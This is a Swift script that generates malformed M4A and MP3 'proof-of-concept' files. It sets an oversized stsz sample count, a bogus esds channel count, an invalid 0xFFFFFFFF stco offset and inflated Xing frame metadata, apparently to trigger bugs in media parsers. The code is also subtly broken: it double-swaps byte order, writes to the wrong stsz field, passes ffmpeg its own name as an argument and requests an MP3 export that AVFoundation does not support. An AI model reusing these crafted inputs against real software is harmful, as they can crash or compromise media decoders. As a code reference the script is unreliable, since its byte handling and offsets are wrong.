import Foundation
import AVFoundation
import CoreMedia

// Helper to parse and modify MP4 atoms
class MP4AtomParser {
    var data: Data
    var position: Int = 0
    
    init(data: Data) {
        self.data = data
    }
    
    func readUInt32() -> UInt32 {
        guard position + 4 <= data.count else { return 0 }
        let value = data[position..<position+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
        position += 4
        return value
    }
    
    func readData(count: Int) -> Data {
        guard position + count <= data.count else { return Data() }
        let subdata = data[position..<position+count]
        position += count
        return subdata
    }
    
    func findAtom(_ name: String) -> (offset: Int, size: Int)? {
        let nameData = name.data(using: .ascii)!
        position = 0
        while position < data.count {
            let start = position
            let size = Int(readUInt32())
            let type = readData(count: 4)
            if type == nameData {
                return (offset: start, size: size)
            }
            position = start + (size == 0 ? data.count : size)
        }
        return nil
    }
    
    func replaceData(at offset: Int, with newData: Data) {
        data.replaceSubrange(offset..<offset+newData.count, with: newData)
    }
}

func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
    // PoC 1: Set stsz sample count to 8192
    let data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let stsz = parser.findAtom("stsz") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stsz atom not found"])
    }
    
    // stsz format: version (1), flags (3), sample_size (4), sample_count (4)
    let sampleCountOffset = stsz.offset + 8 + 4 // Skip version, flags, sample_size
    var newData = Data()
    newData.append(contentsOf: UInt32(8192).bigEndian.data)
    parser.replaceData(at: sampleCountOffset, with: newData)
    
    try parser.data.write(to: outputURL)
    print("PoC 1: Set stsz sample count to 8192 in \(outputURL.path)")
}

func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
    // PoC 2: Set esds channel count to 8
    let data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let esds = parser.findAtom("esds") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "esds atom not found"])
    }
    
    // esds channel config is at offset 0x1B from esds start
    let channelOffset = esds.offset + 8 + 0x1B
    parser.replaceData(at: channelOffset, with: Data([8]))
    
    try parser.data.write(to: outputURL)
    print("PoC 2: Set esds channel count to 8 in \(outputURL.path)")
}

func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
    // PoC 5: Set invalid stco offset
    let data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let stco = parser.findAtom("stco") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stco atom not found"])
    }
    
    // stco: version (1), flags (3), entry_count (4), entries (4 each)
    let entryOffset = stco.offset + 8 + 4 // Skip version, flags, entry_count
    var newData = Data()
    newData.append(contentsOf: UInt32(0xFFFFFFFF).bigEndian.data)
    parser.replaceData(at: entryOffset, with: newData)
    
    try parser.data.write(to: outputURL)
    print("PoC 5: Set invalid stco offset in \(outputURL.path)")
}

func generateMP3(inputURL: URL, outputURL: URL, pocNumber: Int) throws {
    // Generate MP3 using AVAssetExportSession
    let asset = AVURLAsset(url: inputURL)
    guard let exportSession = AVAssetExportSession(asset: asset, presetName: AVAssetExportPresetAppleM4A) else {
        throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create export session"])
    }
    
    exportSession.outputURL = outputURL
    exportSession.outputFileType = .mp3
    exportSession.audioSettings = [
        AVFormatIDKey: kAudioFormatMPEG4AAC,
        AVSampleRateKey: 44100,
        AVNumberOfChannelsKey: 1,
        AVEncoderBitRateKey: pocNumber == 4 ? 320000 : 128000 // PoC 4: 320 kbps
    ]
    
    // Export MP3
    let semaphore = DispatchSemaphore(value: 0)
    exportSession.exportAsynchronously {
        switch exportSession.status {
        case .completed:
            print("PoC \(pocNumber): Generated MP3 at \(outputURL.path)")
            if pocNumber == 3 {
                // PoC 3: Add Xing frames=20000 metadata using FFmpeg
                let ffmpegCmd = [
                    "ffmpeg", "-i", outputURL.path, "-c:a", "copy",
                    "-metadata", "frames=20000", "\(outputURL.path).tmp.mp3"
                ]
                let process = Process()
                process.executableURL = URL(fileURLWithPath: "/usr/local/bin/ffmpeg")
                process.arguments = ffmpegCmd
                try? process.run()
                process.waitUntilExit()
                
                // Replace original MP3
                try? FileManager.default.removeItem(at: outputURL)
                try? FileManager.default.moveItem(at: URL(fileURLWithPath: "\(outputURL.path).tmp.mp3"), to: outputURL)
                print("PoC 3: Added frames=20000 metadata to \(outputURL.path)")
            }
        case .failed:
            print("PoC \(pocNumber) MP3 error: \(exportSession.error?.localizedDescription ?? "Unknown")")
        default:
            print("PoC \(pocNumber) MP3 export status: \(exportSession.status.rawValue)")
        }
        semaphore.signal()
    }
    semaphore.wait()
    
    if exportSession.status != .completed {
        throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "MP3 export failed"])
    }
}

func main() {
    let fileManager = FileManager.default
    let sampleRate = 44100.0
    let channels = 2
    
    for i in 1...5 {
        let inputFile = "base_poc\(i).m4a"
        let outputM4A = "poc\(i).m4a"
        let outputMP3 = "poc\(i).mp3"
        
        guard fileManager.fileExists(atPath: inputFile) else {
            print("Error: \(inputFile) not found")
            exit(1)
        }
        
        let inputURL = URL(fileURLWithPath: inputFile)
        let outputM4AURL = URL(fileURLWithPath: outputM4A)
        let outputMP3URL = URL(fileURLWithPath: outputMP3)
        
        do {
            // Generate M4A
            switch i {
            case 1:
                try manipulatePoC1(inputURL: inputURL, outputURL: outputM4AURL)
            case 2:
                try manipulatePoC2(inputURL: inputURL, outputURL: outputM4AURL)
            case 3, 4:
                try fileManager.copyItem(at: inputURL, to: outputM4AURL)
                print("Copied \(inputFile) to \(outputM4A) for PoC \(i)")
            case 5:
                try manipulatePoC5(inputURL: inputURL, outputURL: outputM4AURL)
            default:
                break
            }
            
            // Generate MP3
            try generateMP3(inputURL: inputURL, outputURL: outputMP3URL, pocNumber: i)
        } catch {
            print("Error processing PoC \(i): \(error.localizedDescription)")
            exit(1)
        }
    }
}

extension UInt32 {
    var data: Data {
        var value = self.bigEndian
        return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
    }
}

main()
